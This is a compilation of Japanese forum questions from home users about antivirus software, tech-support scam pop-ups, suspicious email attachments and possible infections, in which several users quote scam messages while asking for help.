Avira Free版が更新できなくて困っています。 具体的には更新すると 「更新を開始したときに次のエラーが発生しました　：　スケジューラーサービスが起動していません。サービスを再起動し再度実行してください。」 とエラーを返されます。 再起動しましたが改善されませんでした。 また、調べた結果　http://okwave.jp/qa/q6193211.html　で ＞aviraを起動して、 ＞管理 ＞↓ ＞スケジューラー ＞↓ ＞定時アップデートという項目を選択して、右クリック ＞↓ ＞ジョブの編集でスケジュール設定を行って下さい。 ＞それで解決すると思います。 と言う解答を見たのですが、３つ目の定時アップデートと言う項目が見つかりませんでした。 解決方法ありましたらお教えください。 よろしくお願いします。<(_ _)> OS：Windows8.1
どうですか？
友人が非公開の動画のアドレスを送って来たのですが、 もちろん非公開で観ることは出来ません。 先方には何を送り直してもらえばよいでしょうか？ 送って来た側もよく理解出来ていません。
教えて下さい。助けて下さい パソコンで検索調べ物をしていたら、急にあなたのパソコンがウィルスに感染という画面が出て音も鳴り出しました。焦ったので画面の中の電話番号にかけてと出ていたのでかけました。相手に言われるがままにteamviewerというアプリをインストールしてしまい相手にアプリのパスワードを教えてしまいました。5分後そこで夫が帰って来てすぐに電話を切り、パソコンのシャットダウンをし、クレジットカードの暗証番号番号も変更しました。 その後teamviewerをアンインストールしました。 今はオフラインの状態にしています ちなみにpcワクチンではウィルスは検出されていません そこで質問です。まだ私のパソコンは危険な状態でしょうか？ またそうならどういう対処が必要でしょうか。 不注意であったと思います。 よろしくお願いします教えて下さい
ｅｘｃｅｌの表を作っているんですが添付のような白い四角ができてしまって、そこにカーソルを当てると、強制終了になってしまいます。これはどうすれば直せますか？ウイルスでしょうか？
先日あるIT企業に面接に行きました。 そこでルーターに関するセキュリティの名前で思い浮かぶものを挙げてください、と言われたので、ファイアウォールと答えたのですが、求められていた答えは違うようでした。 wwwにも関わるものというヒントも頂いたのですが、最終的に答えられず終わってしまいました。 答えは何だったのでしょうか。 未だにわからず、気持ちが悪いです。 何方か思い浮かぶ方、いらっしゃいましたら教えてください。
今日、普通にマックで調べ物をしていたら、いきなり変なサイトがポップアウトしてきて、マックキーパーともう一つ変なアプリをダウンロードさせられ、しかも音声付きで「あなたのパソコンはウイルスに感染しました。以下の電話番号に電話してください。」　そして焦った私はその電話番号に電話してしまいましたが、外国人の人がつたない日本語で対応してきたので、詐欺だと思いすぐに電話を切りました。幸い私はノートンセキュリティーに入ってたのですが、それでもクレジットカードとかが不正に使われたらとっても困るので、すごい不安です。一応マックキーパーともう一つの変なアプリはパソコンから削除することはできました。しかし、ノートンセキュリティーはこのようなクレジットカードとか個人情報なども守ってくれるのですか？
去年の夏のことです。 バックアップしてたら バックアップできません となってしまい、メモリースティックにデータをコピーしようとしたら途中で進行が停止してしまい、何度やってもコピーできませんでした。 ノートンの警告に気がついて見てみると スパイ監視の更新ができません とかになっていました。機能の復元をクリックしても反応しませんでした。 システムの復元で数日前に戻しましたが、直りませんでした。 直近にダウンロードしたソフトもすべてアンインストールしましたがダメでした。 ウィルスの心当たりとして、あるコンクールからの返信があり、そこのメールアドレスをクリックしました。症状が出る一週間ほどまえです。 その後、グッドウィルにもっていきました。スタッフの話では 高レベルのタチの悪いウィルスかも・・・ でも、買ったのもグッドウィルなのでPCのせいとは言えなかったような気もします。 修理から帰ってきたのでさっそく例のメールをクリックしてみました。すると二時間ほどしてまた前と同じ症状が出ました。その後、暑さのせいかと思ってクーラーをつけました。私は34℃までは裸になれば耐えられますので以前はそうしていました。 ・・・ところが翌朝になってものは試しと思ってシステムの復元をしてみると・・・直ってしまったのです。 その後、例のメールを何度クリックしても異常は出ません。 これは一体なんだったのでしょうか？ 詳しい方ヘルプです。 OSはWindows7でPCはIIYAMAです。
問題のパソコンはノートです・・ 　以下の「画像を添付」を参考にされてください。 　最近！「内部電池要領の低下」と思われる不具合で、ファイルの更新履歴が７年前後に表示されます。 　以下の「画像の添付」を参考にされてください・・・ 　”月末でないのに”私のパソコンの日付ログに合わせt”表示”されるようになりました。 私のパソコンみたいに、時間ログがあいまいなパソコンも存在するのに・・・ これって自己の危機管理体制の問題ありますでしょうか・・・ 以上よろしくお願いいたします。
回答お願いします。 ＥＳＥＴのパーソナルセキュリティー３年版か　ファミリーセキュリティー５台３年版を購入予定です。もしパーソナルセキュリティー３年版を購入し、３年未満でパソコンが壊れたらウイルス対策ソフトを再度購入しないといけないのでしょうか？　ファミリーセキュリティー５台３年版とは複数台のパソコン　スマホ等で使用可能なのですよね？　 現在、自宅にパソコン１台　旦那・妻の携帯スマホ・タブレット１台です。　他にパソコン等購入予定はないのですが、パソコンが壊れた場合を考えたら５台３年版のほうがよいのでしょうか？　スマホにセキュリティーするほどでもないかなとは考えてはいます。
Windows7でChromeを使用していますが、 最近画面の左上に小さいウインドウが出てくるようになりました。 「Chromeでのブラウズを保護する ノートンセキュリティ機能拡張をインストールする」とのメッセージで、 「必要ありません」と「今すぐインストール」のボタンがあります。 これは入れた方が安全なのでしょうか・・・？良く分かりません。 一般的な対処法を教えて下さい。 よろしくお願いします。
うっかり　登録　口座番号まで　入力してしまいました　対応策　教えてください
ウイルスソフトにノートン360を使っていますが、高いしサービスが悪いので 他に変えようかと思っています。 プロバイダーがニフティなので「常時安セキュリティ」でカスペルスキーのサービスが 受けれるらしいです、カスペルスキーについてよく知りませんがどうでしょうか？ 他に良いサービスはないでしょうか？ ノートンは自動延長になってしまい気が付いたら延長されて困っています。 どうしたら自動延長を止める事ができますでしょうか？ 以上、お教え頂けますよう宜しくお願い致します。
パソコンでネットをしていたら突然「PC Speedup Pro Repair」という画面が立ち上がりました。「あなたのパソコンは重大なウィルスに感染しました。保存されたファイルが破壊されます。ただちにインストールして下さい…云々。」というメッセージと共に。 「PC Speedup Pro Repair」についてご存じの方は教えて下さい。 信頼してダウンロードして良いものでしょうか？ ちなみにバージョンはWindows 10です。 URLは　http://www.pcspeeduppro.net/clkdlr/jp/?x-context …　となっています。
お世話になります。 二週間ほど前にOSをWindows10にアップデートしました。 あまりにアップデートしてしてうるさく、アップデートに同意した覚えもないのに勝手に（私が何か触ったのかもしれませんが）アップデート日まで決められてて「まあそこまで言うなら…」と深く考えずにアップデートしてしまいました… そして今日、いつものようにグーグルで検索しようとしたところ「お使いのコンピュータ ネットワークから通常と異なるトラフィックが検出されました」というメッセージが表示されました。 初めて見るメッセージで、調べてみたところウイルスの可能性もあるようでした。 「ESETからは何も言われてないけど、一応スキャンしようかな」と思って「隠れているインジケーター」からESETを選択しようとしたところESETが見当たらず、そこで初めてESETが機能していないことに気が付きました。 「PCを立ち上げた時にESETの画面が出るんだから、出なかったらその時点で気づくのでは？」と言われそうですが、正直あったような無かったような…という感じで、毎回全くの無意識でPCを立ち上げていたので、Windows10にアップデートしてからずっとESETが機能していなかったのかそうではないのかも分かりません。 でも、ESETの公式HPに「Win10にアップデート後、ESETが消える不具合が報告されている」という記事があったので多分アップデートしてからずっと機能してなかったと思います… ちなみにプログラム一覧にはESETは入ってはいたのですが、アプリ一覧には入っていませんでした。 慌ててプログラムを削除し、ESETを再びDLしてアクティベーション後に再起動→スマート検索をかけてみましたが何も出てきませんでした。 これは二週間ほどESETは機能してなかったけれど、運良く何も入って来なかったと考えていいのでしょうか？楽観的すぎるでしょうか… ちなみにWindows Defenderはデフォルトでは無効なのか？？呼び出すと「無効になっています」というメッセージが出てきました。 あと普段はアクセスしないのに、間の悪いことに海外のサイトにアクセスしています… B9DMとDailymotionというサイトです。バカなことをしたと大反省です… 復元ポイントからシステムの復元をしようかとも思いましたが「無効です」というメッセージが出ています。 できれば初期化は避けたいのですが、もう初期化しかありませんか？ 「ESETで何も検出されないならウイルス・スパイウェアに関しては心配しなくて大丈夫」というのならそのままで行こうかとも思うのですが… 本当に無知なもので、まるで判断がつきません。 お詳しい方いらっしゃいましたら、ぜひ教えて下さい。よろしくお願いします。
インターネットで動画を見ていたら、パソコンが危ない状態になっているのというメッセージが出て 修復するよう指示がありました。ダウンロードすると　ＰＣ　ｓｐｅｅｄ　ｕｐ　ｐｒｏ　がインストールされ、修復するようにというメッセージ。修復をクリックすると　5000円の金額がクレジット払いでするように書かれています。無視するべきか？5000円を投資すべきか？知ってる方　教えてください。
いまマカフィーとかいうの使っています。 特に大きな不満はないものの、フリーズしたり、ファイルの右クリックができなかったり、ウイルス等の影響は受けてきたのではないかと推測されます。 ソフトの更新期間みたいですので、この際これを含めてもっと頑丈なウイルスソフトに切り替えたいです。お値段は高額でない方が(;^_^A あと無料でないソフトがいいです。 今でしたらどんなソフトがおすすめなのでしょうか？ よろしくお願いします。
2日前にフリーのCADソフトを起動してデータファイルを開こうとすると別紙写真の詐欺広告CALL:(844)763-5838が示されるため、×印で消すとCADソフトも一緒に消され使用できなくなりました。 ウイルスバスター クラウドで全体スキャンするとCADソフトを起動しても詐欺広告は出なくなり使えるようになりましたので安心していましたが、昨日別のソフトを起動すると、また現れました。 この迷惑詐欺広告の元を完全に消す方法はありませんでしょうか？(居場所がわかりません) よろしくお願いします。
パソコンにメールがきて、差出人が自分のアドレスだったので添付ファイルをうっかり開けてしまいました… 添付ファイル名は document2.docm です。 クリックして、ダウンロードして変だなと思ってすぐ消しました。マクロは有効にしていません(多分) パソコンが遅くなったり、ウィルスに感染したような画面表示は一切ありません。 Windows8使用でマカフィー最新です。Windows updateもちゃんとやってます。 焦って調べていたらそんなメールが先週に大量に送られてるらしいし、オンラインスキャンして何も引っ掛からないけど、ウィルス感染しているのではないかと思い質問させていただきました。 感染しているか調べる方法、対処をご教示ください。よろしくお願いします。
現在のパソコンのウイルスソフトはフリーソフトののavast!とspybotです この２つで大丈夫でしょうか、有料のウイルスソフトにすべきでしょうか、 インターネットバンキングにも使用しているパソコンです、お教えください。
トロイの木馬と書いてありました。マカフィーが見つけてくれて既に隔離済です。自覚症状はありませんでした。 心当たりはDaemon Tools liteをインストールしたことですが…これは関係ありますか？アンインストールした方がよいのでしょうか？ また、隔離と駆除は別物ですよね？マカフィーでは今は安全だと表示されているんですが、本当に大丈夫でしょうか？ 初めての経験なので不安です。 どなたかアドバイスお願い致します。
パソコンのハードディスクランプはパソコンを起動している間はずっと点滅しているのですか？もし、点滅していたら、ウイルスに感染しているのですか？
Eset Smart Security ver9 を購入し、Windows8.1のノートパソコンにインストールしてみました。 しかし、インストールしてからThunderbirdに新規のメールアカウントを登録しようとすると下記のようなエラーが出てしまいます。 追加したいメールアカウントはGmail、Yahoo Japanのメール、Zohoのメールアドレスです。 （１）アカウント操作→メールアカウント追加で　メールアドレスとパスワードを入力し、続けるを押すとThunderbirdが自動的にIMAP/POP3　、SMTPのサーバー情報を拾ってきてくれるはずですが、Eset導入後は「Thunderbirdはあなたのアカウント設定を見つけられませんでした」というエラーが出てしまいます。普段ならimap.gmail.com というように自動入力されるのですが、.gmail.com という記入になっています。そこで、サーバー名を手入力して続行してみたところ、やはりパスワードが間違っています云々のエラーになってしまいます。 Esetの設定から、メール保護とパーソナルファイアーウォールを一時的に無効にして試してみましたがやはり同じエラーが出てしまい、メールアカウントの追加ができませんでした。 しかし、他のパソコンで設定したポータブル版のThunderbirdはこのパソコンで送受信ができるので、現状他のパソコンでポータブル版のFirefoxでプロファイルを作成し、それを読み込ませて使うという仕方をしています。一度設定されたアカウントはどうやら問題なく送受信できるようです。Esetをアンインストールすると問題なくアカウントが追加できるのでEsetが何かをブロックした結果だと思うのですが、改善方法はないのでしょうか？ Thunderbird　esetともに最新版にアップデートをしています。 一時的に保護を無効にしてもダメ、Beckyなど他のメールクライアントではアカウントを追加しても送受信できるようです。AviraやAVGなど他のセキュリティソフトではこの事象は発生しないようです。 何か解決方法はないでしょうか？
私はウイルスセキュリティZEROを使用しているのですが、先日トロイの木馬を検出削除したと右下にポップアップされました。 　しかし発見場所が (x86)\java\ire1.8.0_77\bin\　unpack200.exeやhprof.dll リスク　トロイの木馬（004ed75c1) 処理方法　削除 となっており、同じファイル場所から何度も検出されます。この場合私はjavaに対してどの様な処理を行えばよろしいのでしょうか？
去年の夏に３年間のヤツを入れたんですが試用期間が0日ってなってます。それで、今すぐアクティブ化をクリックするとどうなりますか?
cookieとはなんですか。ウィルス検査で引っかかるのですが、このフォルダ内にまで入ってくることもあるのですか。よくわからないのでよろしくお願いします。
ノートンの有料ソフトの3年間使えるものを買ってパソコンに入れているんですが、体験版の試用期間が終了の表示が出ていて、右側に今すぐアクティブかと出ています。その表示はどうやれば消えるんでしょうか!?
GoogleChromeを起動したら、勝手ににコマンドプロンプトが立ち上がりました。そして、すぐに閉じられます。GoogleChromeを起動したからかは、分かりませんがとにかくコマンドプロンプトが起動します。ウイルスなので しょうか？ 関係ないと思いますが、なぜかログオフされてました。Chromeは「正常に終了されませんでした」的な文が表示されました。つまり強制終了されてたのでしょうか？ 詳しい方教えてください！
avast（無料）を使っていると「ウイルス　フリー。」と付いてくるのですが 有料版で解決しますか？
セーフモードで起動しAVGアンチウィルスソフトを起動させウィルスを検出しましたが、駆除されないまま残ってるようです（２回セーフモードでウィルスチェックしたら同じ数２３個の数のウィルスを検知しました）。どうやれば削除できますか。 AVGの画面が通常起動の時のとでは異なり、ウィルス隔離室にアクセスする部分がないです。ウィルス情報を元にそのファイルを開こうとしても全てロックがかかってます。どうすればウィルスを削除できますか。
２０１６年４月２６日の朝にこうなっていました。 どうしてなのでしょう？？
すいません。緊急です 今、Yahoo!で、画像を調べていて あるサイトをクリックしたら ウイルス感染がどーのこーのって 出ました。これってどうすればいいんですかね？ 凄く怖くて涙が出てきました 親に言う事も出来ません 私のせいでうちが借金とかになったらって 考えてしまって・・・ ワンクリック詐欺とかじゃないんですか？
最近サイトを見ていると画像のような警告メッセージが頻発して困っています。 ウイルスでしょうか？ 間違ってOKは押してないはずです。 警告が出るとブラウザをすぐ閉じるようにしています。 不安だったので端末を初期化してみましたが、サイトを見ているとまた出てきます。 今まではこんな事無かったのですが、ウイルスの仕業でしょうか？ 不安で仕方がないです。 スマホがあまり詳しくないので対応策等教えて下さい。
メールできたファイルを何げなく開けてしまったら、パソコンのデータ（接続していたUSB・外付けHD）すべてが感染し、ファイルを開くことができなくなりました。インターネットもつながらなくなりました。対処方法ご存知な方、おられませんでしょうか？
パソコンの不具合についてご教授下さい。 所持しているPCは ・富士通LIFEBOOK AH550/5B ・Windows7 ・ウイルスソフトはアバスト無料版使用 WindowsUpdate自動更新後にPCが起動出来なくなりました。 症状としましては FUJITSUロゴ→Windowsを起動しています 画面までは通常通りに起動され、その後黒い画面にマウスカーソルが表示されたまま先に進む事が出来なくなるというものです。（カーソルは動きます） その際ハードディスクランプは点滅、電源ボタンは点灯されており、その状態でCtrl+Shift+Escを同時押ししてもタスクマネージャーは起動出来ませんでした。 セーブモードでも同様です。 その他 放電をしても効果なし 起動時トラブル解決に進む場合があるが、スタートアップ修復は不可 ハードウェア診断ツールではCPU、メモリ、ディスプレイ、ハードディスク全てに丸が付きました。 過去の類似した質問やHPを拝見したところ 一時期流行したGumblarウイルス（GENO)の典型的症状であり、またwindows7ではユーザプロファイルが壊れた際も同様の症状が出るという事でした。 データは全て消えてしまっても構わないのですが、この場合どのような対処をするのが最善でしょうか？ またこのウイルスに感染していたとして具体的にどのような被害、例えば個人情報やパスワードが盗まれる等の恐れはございますか？web上でパスワードを入力する等の操作を頻繁に行っていた為非常に不安です。 PCに疎く支離滅裂な質問でしたら申し訳ございません。詳しい方がいらっしゃいましたらアドバイス頂けると非常に助かります。宜しくお願い致します。
アビラフリーアンチウィルスは、アビラのページにはos対応にｘｐが載ってませんが、実質ｘｐに対応してますか？
InternetSpeedTracker、InboxAceのタブおよびアンインストールしたい。 コントールパネルに該当プログラムがないので、アンインストールができません。 どうしたら、よいのですか？
AVAST を使っており１年間有償のクリーンアップを使っていますがもうすぐ期限が来るので更新しようとしましたが、情報入力画面で日本語入力が出来ず、コピペで入力して支払画面でクレジットカード情報を入力してエンターすると前の画面に戻ります。何度やっても同じ反応です。収納代行のデジタルリバー株式会社のサポート番号を突き止めたのですが全く電話に出ません。あきらめた方が良いでしょうか。それならそれで更新をあきらめます。
androidで、WEBブラウザを開くと、繰り返し、ウィルスに感染しましたのポップアップが出ます。 しょっちゅう出ます、毎回、閉じてますが、心底うざいです。 androidを初期化しましたが、まだ出てきます。他の症状は特にありません。 360 セキュリティを入れてしまった時に、アドウェア？に感染したのかなと、思っているのですが、 対処法を教えて頂けたら助かります。 よろしくお願いします。
Windows10でspeedupMyPCをダウンロードしてしまい、毎回電源を入れるたびに表示が出てきます、パソコンには全く詳しくないので消し方教えてください
画像のようにintel(R)Control Centerのロゴ？とゆうのかな？ まあそれがおかしくなってますよね？たぶん。。。 もとのロゴがわからないのでたぶんおかしくなってますよね？ たしかintel(R)Control Centerってｐｃの安全性とかですよね このロゴがくるってんならウイルスかな？ とか思ったりしてます くるってんなら原因をわかる方教えてください できれば対処法もお願いします
windowsのセキュリティはどのようにすればいいのでしょうか？ セキュリティを調べてもシステムホールとかウイルスとかありますがあまりよくわかりません 簡単にできる方法を教えて下さい 簡単にお願いします
私は普段はAVGやノートンのようなセキュリティソフトを使っています。 たまにDr.webCure It!やEmsisoft のEmergency kit を使ってセカンドオピニオン的にパソコン全体のチェックを行っています。 Drweb Cureit! は使いやすいですが他に似たようなものでフリーで使えるものがあれば教えて下さい。 希望条件は （１）インストール不要、またはポータブル版みたいにUSBメモリに入れたりできる （２）オンラインスキャンではくダウンロードしてローカルで使えるもの （３）定義ファイルもしくは本体が毎日更新されるもの です。みなさんのオススメを教えて下さい。よろしくお願いします
友人のPC（デスクトップ）が　インターネットのみ固まったり　シャットダウンされる状態で 相談されました。エクスプローラでもクロームでも同じ状態のようです。 トップページは表示されますが　それ以降なにも動かないとのことです。 インターネット以外は普通に動きます。 特に心当たりはないものの（なにかDLしたとか記憶にないそうです）　 ウィルス感染なのかと思うのですが ネットが起動しないので　ウィルスソフトのDLもできない状態です。 ウィルスソフトなどのCDロムはないそうです。 情報不足で申し訳ありませんが　現在ウィルスソフトが何が入っているのか また　入っていないのか不明です　入ってたとしてフリーのソフトだと思います。 1.私の家でUSBにウィルスソフトをDLしたら　友人のPCでインストールして使うことは可能でしょうか？ 2.その場合　お勧めのソフト（フリーでお願いします）ありますか？ 3.ウィルスじゃないとしたら　どのような原因で　また対策はありますか？ 最悪はリカバリになるかもしれないのですが　できればそれは避けたいので なにか　良い方法教えてください。
ウエブで検索中に、以下の表示がありました。これって信用してダウンロードして大丈夫ですか？ …以下表示内容… お使いのコンピューターは、最近(5)分間に(13)個のウイルスに攻撃された可能性があります！ このウイルスを除去しないと、感染がシステムファイルに広がり、すべてのファイルが削除され、ハードドライブに回復不能な損傷を引き起こす可能性があります。 オペレーティングシステム： Windows 10 場所： ＊＊＊＊＊ あなたのIP： ＊＊．＊＊．＊＊＊．＊＊ 「ダウンロード」ボタンをクリックして、無料のMicrosoftアンチウイルスをダウンロードしましょう。 …終わり… ちなみに、当該パソコンにはマカフィーはインストール済みです。
大変恐れ入りますがウイルス感染に詳しい方にご指導頂けると助かります。よろしくお願いします。 先月新しいパソコンを購入し使用中です。windows10、ウイルスバスターが同梱されています。 昨日ウイルスバスターから以下のメッセージが出ました。 ウイルス　脅威　TROJ_GEN.R047C0OD216 影響を受けるファイル　C:¥Program Files (x86)¥WinTaske¥WinTaske¥WinTaske.exe 処理　削除済 ウイルス　脅威　TSC_GENCLEAN 影響を受けるファイル　C:¥WINDOWS¥system32¥Tasks¥WinTaske 処理　削除済 これは危険な状態なのでしょうか 確認したところ家族の者が先週いくつかソフトをダウンロードしたようです。 Lhaplus dvdfab Imgburn dvd Shrink DAEMON Tools というのが入っておりました。これが原因でしょうか。 いろいろと引っ越し作業をしたので、できればこのまま使用したいのですが、安全性に問題が あるようであれば即対処いたします。どうかご指導よろしくお願いします。
パソコンのファイルが突然末尾にｍｐ3の拡張子が付けられています。・・・画像が開けなくなりました。・・・・ウイルスですか？？？
僕は先日、パソコンのウイルスバスタークラウドの有効期限が切れたので新しく買うことにしました。一つのウイルスバスタークラウドで３台まで接続することができるそうなので、iPhoneにも入れたいと思いアプリをダウンロードしました。 そのアプリでログインして、シリアルコードを入力すると思っていました。しかし、「購入・有効化」 をタップして上のほうにある「ライセンスを移行しますか？」をタップしてログインしました。しかしシリアルコードを入力する場所が見当たりません。もしかしたらもう３台中の２台目として登録できてるのかもしれないと思ったのですが、パソコンのほうから確認すると、ウイルスバスタークラウドにはパソコンしか登録されておらずウイルスバスターモバイル体験版でした。 iosのウイルスバスタークラウドのアプリではシリアルコードは使えず、iPhoneから別途購入しないと使えないのでしょうか？だとしたら３台使えるというのはandroidに限るのでしょうか？教えてください！
セキュリティソフトの期間延長を購入したのに、ソフト上に反映されません。どうしてでしょうか。 それとも時間が経てば勝手に購入状態が反映されるのでしょうか。 それともいったんアンインストールして、再インストールするしかないでしょうか。 ネットで調べても該当情報が見つかりません。 ご存じの方、お願いします。 ちなみにマカフィーリブセーフです。
ツイッターやYahoo!にログインしたままChromeをアンインストールしてしまったのですが、まずいですか？ ログアウトしてからアンインストールしないと情報とか漏れませんか？
ウイルスバスターを入れている場合、Windows Defenderって無効のままで良いですか？
ウエブルート・スパイスイーパーを購入して使っています。 サブスクリプションが１ヶ月を切ったと表示があります。 それで、継続購入をどうしたら良いか、ネットを検索しておりましたら、 softonicというサイトで無料ダウンロードの画面に出会いました。 これの評価というか、ウエブルートにお金払わなくても、 これまで通りにセキュリティーソフトとして有効に機能するでしょうか？ 信用できるでしょうか？ また、お金を出して購入した場合とどう違うでしょうか。 お教え下さい。 ＊＊ 最初にこのスパイスイーパーを入れて貰ったのがヤマダ電気でした。 そのとき期限が来たらヤマダ電気に来るようと店員にいわれました。 それで先日伺いましたら、ヤマダ電気では、すでにこれを扱っていないので、 直接ウエブルートに連絡して欲しいと言われました。 それで､ウエブルートのカスタマー・サポートに問い合わせましたが、 返事がきません。 それで、質問しました。 よろしくお願いします。
離れて住んでいる子供から、LINEが入りました。 「今、PCいじってたら音声が流れて・・・ 警告！このソフトウェアはウィルスがなんちゃらかんちゃらで、下記の番号に今すぐ電話をしてください。それまでは他の動作が一切できません。 で、電源OFF以外何も出来なかったのでOFFっちゃったけど、大丈夫かな～。 電話は危なそうなので止めたけど」 と。 こんなことってあるんですか？ とりあえず、分からないので電源切っちゃったままのようなんですが。 残念ながら、ウィルスソフトはまだ何も入れてないようなんです。 起動させてないようですが、この場合、何か問題ありますか？
ダウンロード3年版をシマンテックストアで購入したのですが、そのときは14,880円(税込)。 今回自動更新の連絡を見ると、有効期間が1年延長にも関わらず10,180円(税抜)。 手間暇なしで延長できるとはいえ、あまりにもコスパが悪いような気がします。 自動更新を解除して、有効期間最終日にでも新規にダウンロード3年版を購入した方がコスパは良いと思いますがどうなんでしょうか？ ちなみに、今シマンテックストアでは、360マルチデバイスの後継？と思われるデラックス3年版が11,880円(税抜)もしくはその上位グレードのプレミアム3年版14,880円(税抜)になってるので、明らかにこちらの方を購入した方がお得に思えます。 もし、今の360マルチの自動更新を解除した場合、有効期間の最終日にアンイストールした上で、先の新しい3年版を購入しインストールすればいいのでしょうか？ アドバイスのほど、よろしくお願いいたします。
家にウィルスバスターを入れていないパソコンが1台あります。 ウィルスバスターを入れていないとインターネットを繋ぐだけで感染するという恐れがあることは分かっています。 ちなみに、そのパソコンはワイハイのみの接続であり切断できます。 ワイハイを切断してインターネットを繋げなくし、放置していても何かしらのトラブルが起こるでしょうか？
広告をクリックしただけでウイルス感染するらしいですが、 これはウイルスバスターなどのセキュリティソフトで防げますか？
PCのOSは、WINDOWS7です。 まだ有効期限が300日以上あるのですがノートンセキュリティが「保護は、無効になりました」と 表示され期限が0日になります。 ノートンセキュリティをアンインストールしCDからインストールするのですが インストール後、ライブアップデートし適用し再起動後、ライブアップデートすると 完了後、保護は、無効になりましたと表示されます。 どう対応したらいいですか？ 少し前にも保護は、無効になりましたと表示されたのでアンインストールしCDからインストール し、ライブアップデートしたら、うまくいきました。 PCは、Q&Aを見て対応するぐらいならできるレベルです。 できるだけ簡単に説明してください。 宜しくお願いします。
さいきん、新しいWindowsパソコンを買いました。ですが、コンピューターウイルスが心配なのでオススメのウイルスバリアソフトを教えて下さい。　 なみに、OSはWindows10です。
ウィルス対策ソフトのホームページを見ると、どこもうちがNo.1だと言っていますが、ぶっちゃけ何を基準に選んでますか？
必要が生じまして、最近XPモードをインストールしました。 そこで質問です。アンチウィルスソフトは必要でしょうか？ 現在XPモードで使用する時はLANケーブルを抜いていますが、この対応で大丈夫でしょうか？ （XPモードでの使用中にUSBやフロッピーから感染する可能性もありますが、その可能性は別として。なおWindows7を使っている時はLANケーブルは差し込まれています） また必要な場合、現在サポート期限も切れて久しいXP用のアンチウィルスソフトというものは存在するのでしょうか？ 自分で検索もしてみましたが、いまいちよくわからず…どうぞよろしくお願いします。
自分のPCの閲覧履歴ってTwitterの友達にバレたりしませんか？
先ほど海外から怪しいメールが来ました！ 返金しますみたいな内容のようですが、海外から買い物をした事もないのにこんなメールが来るなんておかしいですよね？文章の最後に添付ファイルがありました。うっかり開いてしまいました！ 暗号のような英文がツラツラツラありました！ 新種のウィルスかハッキングでしょうか？今のところスマホは普通につかえてます。ハッキングなら色々情報が漏れてないかすごく心配です！ 英語が得意な方、コンピュータウィルスなどに得意な方いらっしゃいましたら内容や対処法を教えてください！ 『DAIRY CREST GROUP has just sent you a full refund of $6902.13 for your purchase. If you have any questions about this refund, please contact DAIRY CREST GROUP The refund will go to your bank account. It may take a few moments for this transaction to appear in your account. To see all the transaction details, please download and view document attached to this mail. King Regards. Deshawn Swanson Deputy Director of Finance』
現在ウィルスバスターを導入しています、パソコン動作は遅く感じますが特に問題はありません（感染等もないと感じています）。知人から他のアンチウィルスソフト「カスペルスキー」を貰ったのですが、バスターを消去してこれに替えるメリットはあるでしょうか。
IPアドレスからどのサイトを閲覧したかってわかるんですか？
先月マカフィーのトータルプロテクションを自動更新しましたが、デバイスの保護は万全でない、ファイアーウオールが無効ですの警告が毎回出ますが何故でしょう、どこに相談したら良いでしょうか。
私はlockyウイルスに感染しています これは助けていません ( http://sakujosuru.jp/guides/locky ) あなたは何を提案することができますか？
パソコンのウィルスの感染確認方法を教えてください
MBSA(Microsoft Baseline Security Analyzer)について質問です。 ・実行環境 　OS：windows7 　IE：IE8 ・MBSAの設定 　セキュリティ更新プログラムをチェックする 　Microsoft Updateとスキャンの前提条件に対してコンピュータを構成する 　詳細なUpdate Serviceオプション 　Microsoft Updateのみを使用してスキャンする にチェックを入れてスキャン開始したところ、以下のエラーが発生しました。 ------------------------------------------------------------------ セキュリティ更新プログラムのスキャン中にエラーが発生しました。(0x8024001d) ------------------------------------------------------------------ 数ヶ月前まではこの方法でスキャンが出来ていて、その後も特にPCの設定を変えた覚えがありません。 このエラーが出てしまう原因や、こうしてみては？という考えをお持ちの方いらっしゃいましたら教えて下さい。。m(_ _)mよろしくお願いします。
つい先日MacBookProを購入したのですが、急に熱くなりファンがうるさくなり始めました。何かと思いウイルスバスターでスキャンしたのですが脅威となるウイルスは検出されずアクティビティモニターで確認するとDCAManagerがCPU負荷を上げているようです。終了させるとファンもうるさくなくなり、熱くもなくなるのですが一体何なんでしょうか。DCAManagerを調べても海外のサイトばかりでわかりません。解決法を教えて下さい。
現在家族でパソコン3台を利用しています。 インターネット接続は、光ブロードバンドルーターでパソコンAは有線接続、後B・Cは無線LUN接続です。特にネットワークや共有機能は構築していません。 プロバイダーオプションのセキュリティソフトが３台まで有効なのでこれを利用しています。有線接続のA以外は使用頻度も少なく危険性の少ない特定用途での利用です。従って、現在セキュリティ上のリスクは小さいと思いますが、以下の点が疑問です。ご教示ください。 Ⅰ　パソコンAでインターネットバンキングをしており、インターネットバンキング専用セキュリティ　　ソフトもインストールして万全を期しているつもりですが、仮にパソコンBでウイルスに感染した　　場合、パソコンAにも被害が及ぶものでしょうか？ 　　セキュリティソフトで防御しているから大丈夫という意味ではなく、ネット接続の理論上はどうな　　のでしょうか。 ２．大事なパスワード記録などはパソコンハードディスクに保存しないようにといわれますが、外付け　　ハードディスクでも同じですよね。この場合、全くリスク度は同じなのか、多少はリスク度が低い　　のか如何でしょうか。
知人が、XPのノートPCを、拾って入手し、自宅の有線LANにつなぎ、ネット視聴等をしました。 ですがウィルスを恐れ、自身のGmailアドレス等からは、一切ログインしていません。 ログインが必要なページには一切入っていないそうです。 無料ウィルス対策ソフトのキングスソフトを、ダウンロード＆インストールして、フルスキャンも行っています。 ですが、ときを同じくして、自身のGmailアドレスから、自分に対し迷惑メールが送信されるようになったそうです。さらに自身が加入しているGmailグループにも、迷惑メールの一斉送信があったそうです。（配達員が、電話番号記載違いで配達完了できず、日本郵政ジャパンにご連絡ください、というもの） 自身がそれまで使用しているPCは、Win8.1からWin10にアップしたもので、マカフィートータルプロテクションも入れており、まめにフルスキャンをしているそうです。 お知恵をおかりしたいのは、この知人の考えの妥当なものであるか、否か教えて頂きたいのです。 知人が言うには、 「拾ったXPなので、ウィルス感染している可能性もあるが、キングスソフトでフルスキャンして、ウィルスがないことは確認しており、それは、ある程度信頼できるものだろう。 そして、ネット視聴しているものの、自身のアドレス等からは一切ログインしてはいない。 この場合、ボット等が入り込んで、ゾンビや踏み台にされる可能性は、あるかもしれないが、 自身のGmailアドレスから迷惑メールが不特定多数に送信される、ということはないと思う」　 との見解なのですが、これで正しいのでしょうか？ XPは、Wifi親機にLANケーブルでつなぎ、Win10ノートは、WiFiです。 XPのサービス終了は承知しております。 よろしくお願いいたします。
アクセス解析で「 googlebot」と出るのですが これはスマホで見た場合なのでしょうか？
